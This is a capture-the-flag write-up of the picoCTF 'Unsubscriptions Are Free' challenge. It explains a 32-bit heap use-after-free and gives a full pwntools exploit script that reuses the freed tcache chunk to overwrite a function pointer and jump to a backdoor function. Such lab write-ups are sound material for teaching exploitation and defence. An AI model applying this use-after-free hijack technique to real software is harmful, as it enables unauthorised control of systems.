# CyLab / picoCTF — Unsubscriptions Are Free

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
* **Category:** Binary Exploitation (Heap / UAF)  
* **Difficulty:** Medium (CyLab 3)  
* **Date:** 2026-11-10  
* **Tools:** `file`, `checksec`, `nm`, IDA Pro, `gdb` + `pwndbg`, `pwntools`, Python 3  
* **Binary:** 32-bit ELF (`vuln`) with source code `vuln.c`  

---

## TL;DR

A classic 32-bit Heap **Use-After-Free (UAF)** challenge demonstrating how glibc's memory allocator recycles freed chunks. The program allocates a `cmd` structure containing a function pointer at offset 0 (`whatToDo`). Upon selecting the unsubscribe option (`I` $\rightarrow$ `Y`), the program executes `free(user)` but leaves behind a dangling pointer without resetting it to `NULL`. When we immediately invoke `leaveMessage()` (`L`), glibc's **tcache** LIFO bin reallocates the exact same 16-byte chunk for our input buffer. Overwriting the first 4 bytes with the static address of `hahaexploitgobrrr()` hijacks the control flow on the next loop iteration. A critical real-world hurdle encountered was **stdio buffering** desynchronization between `scanf()` and raw `read(0, ...)`.

---

## Recon

We inspect the binary's properties and security mitigations using `file` and `checksec`:

```bash
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, not stripped

$ checksec vuln
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Key observations:
* **File Type:** ELF 32-bit LSB (x86), dynamically linked, not stripped.
* **PIE:** `No PIE (0x8048000)` — All function addresses in the `.text` segment are static and predictable.
* **Canary:** `Canary found` — Stack canary is enabled, but irrelevant since the vulnerability lies in heap memory rather than a stack buffer.
* **NX:** `NX enabled` — Shellcode execution on the stack and heap is blocked.
* **Symbols:** Running `nm vuln` reveals a backdoor function `hahaexploitgobrrr` located at `0x08049266`:
  ```bash
  $ nm vuln | grep -iE 'haha|main|user'
  08049266 T hahaexploitgobrrr
  0804944b T main
  0804c060 B user
  ```

---

## Static Analysis & Vulnerability

### 1. Code Review (`vuln.c`)

Examining the source code reveals the structure of `cmd` and the main dispatch loop:

```c
typedef struct {
    uintptr_t (*whatToDo)();   // Function pointer at offset 0
    char *username;
} cmd;

cmd *user;

void doProcess(cmd* obj){
    (*obj->whatToDo)();        // Dispatches function pointer
}

void i(){                      // Inquire / Unsubscribe
    puts("You're leaving already(Y/N)?");
    scanf(" %c", &response);
    if(toupper(response)=='Y'){
        free(user);            // Frees struct, but leaves dangling pointer!
    }
}

void leaveMessage(){           // Leave a feedback message
    char* msg = (char*)malloc(8);
    read(0, msg, 8);           // Writes 8 bytes into allocated chunk
}
```

In `main()`, the program initializes `user = (cmd *)malloc(sizeof(user));` and enters an infinite menu loop:
```c
while(1){
    printMenu();
    processInput();
    doProcess(user);           // Always calls (*user->whatToDo)()!
}
```

### 2. Root Cause: Dangling Pointer (UAF)

When option `I` is selected and confirmed with `Y`, `i()` calls `free(user)`. However, `user` is **never cleared to `NULL`**. On the next loop iteration, `main()` blindly passes `user` to `doProcess(user)` and invokes `(*user->whatToDo)()`.

### 3. Heap & Tcache Chunk Recycling Layout

Modern glibc uses per-thread caching bins (**tcache**) for small allocations ($\le 0x410$ bytes):

```text
  1. Allocation:
  +-----------------------------------+  <- user pointer
  | whatToDo (4B)  |  username (4B)   |  (Allocated in 0x10 size class)
  +-----------------------------------+

  2. Free (UAF Dangling Pointer):
  free(user) -> Chunk placed into tcache list (0x10 bin).
  The global pointer 'user' still references this exact heap address!

  3. Reallocation via leaveMessage():
  malloc(8) requests a chunk in the 0x10 size class.
  glibc's tcache pops the most recently freed chunk (LIFO).
  +-----------------------------------+  <- msg (and user) pointer
  | &hahaexploitgobrrr | 'AAAA' (pad) |
  +-----------------------------------+

  4. Control Flow Hijack:
  doProcess(user) -> executes (*user->whatToDo)() -> hahaexploitgobrrr()!
```

Because `malloc(sizeof(user))` (4 bytes on 32-bit) and `malloc(8)` both resolve to the **0x10** heap chunk size class, `malloc(8)` recycles the exact same memory chunk previously occupied by `user`.

---

## Dynamic Analysis & The Buffering Trap

### ⚠️ The stdio Buffering Trap
During exploit development, sending all commands in a single pipeline burst (`b"I\nY\nL" + p32(0x08049266) + b"AAAA"`) immediately caused a `SIGSEGV` crash without triggering `hahaexploitgobrrr`.

* **Root Cause:** The menu reads user choices via `scanf()`, which is **buffered I/O** and greedily reads available bytes from the socket into libc's internal buffer. `leaveMessage()` reads using `read(0, msg, 8)`, which is an **unbuffered raw syscall**.
* When sent in a single burst, `scanf()` consumed the entire payload. By the time `read(0, msg, 8)` ran, the file descriptor had zero pending bytes, returning immediately without writing our target address.

### The Fix: Prompt Synchronization
To prevent desynchronization:
1. Send `I\n`, synchronize by waiting for `(Y/N)?`, then send `Y\n`.
2. Send `L` as a standalone transmission, synchronize by waiting for `try anyways:`.
3. Only then deliver the 8-byte payload: `p32(0x08049266) + b"AAAA"`.

---

## Exploit

We construct the complete exploit script using `pwntools`:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

EXE = "./vuln"
HOST = args.HOST or "xebec.cylabacademy.net"
PORT = int(args.PORT or 30956)

TARGET_FUNC = 0x08049266  # hahaexploitgobrrr()

def main():
    p = remote(HOST, PORT) if args.REMOTE else process(EXE)

    # 1. Free the user chunk (creates dangling pointer in 'user')
    p.recvuntil(b"(e)xit")
    p.send(b"I\n")
    p.recvuntil(b"(Y/N)?")
    p.send(b"Y\n")

    # 2. Reallocate chunk via leaveMessage() and overwrite function pointer
    p.recvuntil(b"(e)xit")
    p.send(b"L")
    p.recvuntil(b"try anyways:")
    p.send(p32(TARGET_FUNC) + b"AAAA")

    # 3. Receive flag output
    output = p.recvall(timeout=5).decode(errors="replace")
    print(output)

if __name__ == "__main__":
    main()
```

*(The complete script is saved in [`exploit.py`](exploit.py)).*

---

## Flag

Running the exploit against the target service triggers `hahaexploitgobrrr()` and retrieves the flag:

```text
OOP! Memory leak...0x8049266
Thanks for your feedback, we will quicklylook at it!
academy{redacted}
```

> **Flag:** `academy{redacted}` *(Redacted in accordance with competition disclosure guidelines)*.

---

## Key Takeaways & Lessons

1. **Use-After-Free & Dangling Pointers**: Calling `free(ptr)` simply releases the allocated heap chunk back to the allocator; it does not clear the pointer variable. Explicitly setting `ptr = NULL;` is required to eliminate dangling references.
2. **glibc Tcache LIFO Recycling**: Small chunks in glibc tcache bins are managed in Last-In, First-Out order. Reallocating a chunk of the same size class immediately hands back the freed memory, allowing an attacker to overwrite stale object structures.
3. **Mixed I/O Synchronization**: When mixing buffered stdio functions (`scanf()`, `fgets()`) with raw syscalls (`read()`), never burst payloads together. Always synchronize with application prompts to avoid buffer starvation.
